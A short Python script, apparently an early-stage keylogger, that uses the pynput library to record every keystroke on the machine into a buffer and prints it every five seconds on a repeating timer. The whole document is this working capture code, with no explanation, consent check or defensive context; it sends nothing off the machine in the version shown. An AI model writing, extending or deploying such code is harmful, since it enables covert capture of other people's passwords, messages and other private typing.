import pynput.keyboard
import threading

log = ""

def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
    
def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listner:
    report()
    keyboard_listner.join()